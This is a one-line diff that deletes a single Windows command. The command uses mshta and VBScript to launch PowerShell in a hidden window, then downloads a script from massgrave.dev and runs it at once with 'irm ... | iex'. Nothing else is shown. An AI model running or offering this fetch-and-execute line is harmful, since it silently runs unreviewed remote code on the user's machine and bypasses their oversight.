@@ -1,1 +1,0 @@
-cmd /C mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""powershell.exe /C irm https://massgrave.dev/get | iex"", 0:close")
